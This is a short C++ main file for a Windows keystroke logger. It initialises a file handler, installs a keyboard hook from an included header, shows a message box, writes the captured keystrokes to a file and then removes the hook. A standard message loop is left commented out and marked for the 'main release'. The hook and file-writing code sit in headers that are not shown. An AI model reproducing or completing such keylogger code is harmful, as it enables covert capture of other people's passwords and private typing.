#include <windows.h>
#include <winuser.h>
#include <bits/stdc++.h>

#include "key_hook.h"
#include "file_handler.h"

using namespace std;

int main()
{
    bool check = file_handler::initial();
    if (!check)
        return 0;

    check = key_hook::create_hook();
    if (check)
        cout << "\n\n\t\tHooked\n\n";
    else
        return 0;

    MessageBoxW(NULL, L"hooking", L"", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
    /*
    // in main release
    MSG m;
    while (GetMessage(&m, NULL, 0, 0))
    {
        TranslateMessage(&m);
        DispatchMessage(&m);
    }
    //end main release
    //*/

    check = file_handler::write(key_proc::captured);

    check = key_hook::delete_hook();
    if (check)
        cout << "\n\n\t\tUnHooked\n\n";
    else
        return 0;

    return 0;
}
